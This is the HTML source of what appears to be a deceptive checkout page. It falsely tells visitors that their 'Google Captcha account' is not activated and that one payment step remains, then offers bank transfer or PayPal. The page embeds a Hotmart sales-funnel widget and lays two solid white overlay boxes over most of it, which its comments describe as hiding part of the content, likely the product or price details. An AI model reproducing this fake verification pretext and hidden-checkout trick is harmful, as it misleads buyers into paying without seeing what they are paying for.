<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Activate</title>
    <link rel="stylesheet" href="css/styles.css">
    <!-- Importa a fonte Open Sans -->
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800;900&amp;display=swap" rel="stylesheet">
</head>
<body>
    <!-- Aviso sobre Captcha -->
    <section class="alert-section">
        <p>&nbsp;️ Last step: Your Google Captcha account is not yet activated.</p>
    </section>

    <!-- Instruções de pagamento -->
    <main class="content">
        <h3>Wait: there is (1) step left for your order.</h3>
        <h3>Select your payment method below and click on the green button to continue.</h3>
        
        <!-- Botões de método de pagamento -->
        <div class="payment-methods">
            <div class="payment-option" data-method="bank-transfer">
                <img src="images/bank-transfer.webp" alt="Bank Transfer">
                <span class="check-icon">✔</span> <!-- Ícone de check -->
            </div>
            <div class="payment-option" data-method="paypal">
                <img src="images/paypal.webp" alt="PayPal">
                <span class="check-icon">✔</span> <!-- Ícone de check -->
            </div>
        </div>
    </main>

    <!-- Seção Hotmart -->
        <div>
            <div id="hotmart-container">
                <div id="box_hotmart">
                    <!-- HOTMART - Sales Funnel Widget -->
                    <!--- sales funnel container --->
                    <div id="hotmart-sales-funnel"></div>

                    <!--- script load and setup --->
                    <script src="https://checkout.hotmart.com/lib/hotmart-checkout-elements.js"></script>
                    <script>
                    checkoutElements.init('salesFunnel').mount('#hotmart-sales-funnel')
                    </script>
                    <!-- HOTMART - Sales Funnel Widget -->
                </div>
                <div id="cover"></div>
                <div id="cover2"></div>
                <!-- Barra principal para esconder parte do conteúdo -->
            </div>
        
            <style>
                /* Container do widget Hotmart */
                #hotmart-container {
                    position: relative;
                    width: 100%;
                    max-width: 650px;
                    height: 420px;
                    margin: 0 auto;
                }
        
                /* Estilo para o iframe do widget */
                #box_hotmart {
                    width: 100%;
                    height: 100%;
                }
        
                /* Cobre o conteúdo com uma camada branca */
                #cover {
                    position: absolute;
                    top: 240px; /* Ajuste conforme necessário para a posição vertical da cobertura */
                    left: 50%;
                    transform: translateX(-50%);
                    width: 650px; /* Largura da barra principal */
                    height: 220px; /* Altura da barra principal */
                    background-color: #FFFFFF; /* Cor branca sólida */
                    z-index: 3; /* Superior ao conteúdo do iframe */
                }

                #cover2 {
                    position: absolute;
                    top: 0px; /* Ajuste conforme necessário para a posição vertical da cobertura */
                    left: 50%;
                    transform: translateX(-50%);
                    width: 650px; /* Largura da barra principal */
                    height: 180px; /* Altura da barra principal */
                    background-color: #FFFFFF; /* Cor branca sólida */
                    z-index: 3; /* Superior ao conteúdo do iframe */
                }
        
                /* Responsividade para ajustar o tamanho da cobertura no mobile */
                @media (max-width: 768px) {
                    #cover {
                        width: 100%; /* Ajusta a largura da cobertura no mobile */
                    }
                }
            </style>
        </div>        

    <!-- Rodapé Fixo -->
    <footer class="footer">
        <img src="/images/logo.webp" alt="Logo" class="logo">
        <div class="footer-links">
            <a href="#">Privacy policy</a> /
            <a href="#">Terms of use</a>
        </div>
        <p>© 2024 All rights reserved</p>
    </footer>
    
    <script src="js/script.js"></script>
    <script src="/js/hotmart.upsell_checkout.js"></script>
    <script src="/js/hotmart.upsell_checkout-1.js"></script>
    <script src="/js/hotmart.upsell_checkout-2.js"></script>
    <script src="/js/hotmart.upsell_checkout-3.js"></script>


</body></html>
